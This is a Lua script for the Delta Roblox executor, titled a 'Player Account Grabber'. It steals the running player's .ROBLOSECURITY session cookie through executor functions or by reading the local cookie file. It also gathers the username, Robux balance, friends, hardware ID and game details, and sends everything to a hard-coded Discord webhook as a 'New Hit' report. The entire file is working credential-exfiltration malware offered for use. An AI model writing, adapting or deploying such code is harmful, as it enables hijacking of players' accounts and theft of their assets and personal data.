--// Delta Executor - Player Account Grabber (Optimized for potential Delta compatibility)
--// Paste your Discord webhook below

local WEBHOOK_URL = "https://discord.com/api/webhooks/1519331564482203700/2kWWgseSi4nFlp05yXgfrxbBcQE3QXQRhiVt9-GaduRjA6iHJtJoHzh0x02ZsbDnbUTG"

--// Services
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local MarketplaceService = game:GetService("MarketplaceService")

--// Utility
local function sendWebhook(data)
    local payload = HttpService:JSONEncode(data)
    local success, err = pcall(function()
        -- Use Delta's 'request' function
        request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = payload
        })
    end)

    if not success then
        -- Fallback to http_request if 'request' fails (less likely with modern Delta)
        pcall(function()
            http_request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = payload
            })
        end)
        -- Note: Without output, we can't confirm failure here easily.
    end
end

--// Grab ROBLOSECURITY cookie (Delta specific)
local function grabCookie()
    local cookie = ""
    local foundCookie = false

    -- Method 1: Try executor-specific functions first (most reliable for Delta)
    pcall(function()
        if getroblosecurity then
            cookie = getroblosecurity()
            if cookie and cookie ~= "" then
                foundCookie = true
            end
        end
    end)

    if not foundCookie then
        pcall(function()
            if get_cookie then
                cookie = get_cookie()
                if cookie and cookie ~= "" then
                    foundCookie = true
                end
            end
        end)
    end

    -- If executor functions failed, and if Delta supports it, try file reading (less reliable)
    -- Note: This method is often blocked or uses different paths.
    if not foundCookie then
        pcall(function()
            -- Common path, but might differ or be blocked
            local cookiePath = os.getenv("LOCALAPPDATA")
                .. "\\Roblox\\LocalStorage\\RobloxCookies.dat"
            -- Check if isfile function exists and the file exists before reading
            if isfile and isfile(cookiePath) then
                cookie = readfile(cookiePath)
                if cookie and cookie ~= "" then
                    foundCookie = true
                end
            end
        end)
    end
    
    -- If still no cookie, it failed.
    if not foundCookie then
        cookie = "Failed to grab" -- Set to this string to ensure the embed shows it.
    end

    return cookie
end

--// Grab player metadata
local function getPlayerInfo()
    local info = {}
    info.Username = LocalPlayer.Name
    info.DisplayName = LocalPlayer.DisplayName
    info.UserId = LocalPlayer.UserId
    info.AccountAge = LocalPlayer.AccountAge .. " days"
    info.MembershipType = tostring(LocalPlayer.MembershipType)

    -- Grab Robux balance via API
    pcall(function()
        local balanceUrl = "https://economy.roblox.com/v1/users/"
            .. tostring(LocalPlayer.UserId) .. "/currency"
        local resp = game:HttpGet(balanceUrl)
        local decoded = HttpService:JSONDecode(resp)
        info.Robux = decoded.robux or "Unknown"
    end)

    -- Friends count
    pcall(function()
        local friendsUrl = "https://friends.roblox.com/v1/users/"
            .. tostring(LocalPlayer.UserId) .. "/friends/count"
        local resp = game:HttpGet(friendsUrl)
        local decoded = HttpService:JSONDecode(resp)
        info.FriendsCount = decoded.count or "Unknown"
    end)

    -- Avatar thumbnail
    pcall(function()
        local thumbUrl = "https://thumbnails.roblox.com/v1/users/avatar-headshot"
            .. "?userIds=" .. tostring(LocalPlayer.UserId)
            .. "&size=420x420&format=Png&isCircular=false"
        local resp = game:HttpGet(thumbUrl)
        local decoded = HttpService:JSONDecode(resp)
        if decoded and decoded.data and decoded.data[1] and decoded.data[1].imageUrl then
            info.AvatarURL = decoded.data[1].imageUrl
        end
    end)

    -- Current game info
    info.PlaceId = game.PlaceId
    info.JobId = game.JobId
    pcall(function()
        local placeInfo = MarketplaceService:GetProductInfo(game.PlaceId)
        info.GameName = placeInfo.Name
    end)

    -- Hardware ID (if executor supports)
    pcall(function()
        if gethwid then
            info.HWID = gethwid()
        elseif getexecutorname then
            info.Executor = getexecutorname()
        end
    end)

    return info
end

--// Build Discord embed
local function buildEmbed(playerInfo, cookie)
    local fields = {
        { name = "👤 Username",    value = "```" .. playerInfo.Username .. "```",     inline = true },
        { name = "🏷️ Display",    value = "```" .. playerInfo.DisplayName .. "```",  inline = true },
        { name = "🆔 UserID",     value = "```" .. tostring(playerInfo.UserId) .. "```", inline = true },
        { name = "📅 Account Age", value = "```" .. playerInfo.AccountAge .. "```",   inline = true },
        { name = "💰 Robux",      value = "```" .. tostring(playerInfo.Robux or "N/A") .. "```", inline = true },
        { name = "👥 Friends",    value = "```" .. tostring(playerInfo.FriendsCount or "N/A") .. "```", inline = true },
        { name = "🎮 Game",       value = "```" .. (playerInfo.GameName or "Unknown") .. "```", inline = true },
        { name = "💎 Premium",    value = "```" .. playerInfo.MembershipType .. "```", inline = true },
        -- Show Executor name if HWID is not available
        { name = "🖥️ HWID/Executor", value = "```" .. (playerInfo.HWID or (playerInfo.Executor or "N/A")) .. "```", inline = false },
    }

    -- Cookie field (split if too long for Discord embed)
    if cookie and cookie ~= "" and cookie ~= "Failed to grab" then
        local cookieChunks = {}
        -- Discord embed limits are 1024 characters per field value
        for i = 1, #cookie, 900 do -- Split into chunks slightly smaller than limit to be safe
            table.insert(cookieChunks, cookie:sub(i, i + 899))
        end
        for idx, chunk in ipairs(cookieChunks) do
            table.insert(fields, {
                name = "🍪 Cookie [" .. idx .. "/" .. #cookieChunks .. "]",
                value = "```" .. chunk .. "```",
                inline = false
            })
        end
    else
        -- This will show "Failed to grab" if the cookie was not found or is empty
        table.insert(fields, {
            name = "🍪 Cookie",
            value = "```" .. (cookie or "Failed to grab") .. "```", -- Ensure it displays the "Failed to grab" string
            inline = false
        })
    end

    local embed = {
        embeds = {{
            title = "🎯 New Hit — " .. playerInfo.Username,
            color = 0xFF3333, -- Red color
            fields = fields,
            thumbnail = { url = playerInfo.AvatarURL or "" },
            footer = { text = "Delta Grabber | " .. os.date("%Y-%m-%d %H:%M:%S") },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ") -- ISO 8601 format
        }}
    }
    return embed
end

--// ═══════════════════════════════════════════
--// MAIN EXECUTION
--// ═══════════════════════════════════════════

local playerInfo = getPlayerInfo()
local cookie = grabCookie() -- This is the critical part.
local embed = buildEmbed(playerInfo, cookie)

sendWebhook(embed) -- This line ensures the webhook is sent.

-- You will not see output in Delta's console for this script by default.
-- If the webhook is sent, you will see it in your Discord channel.
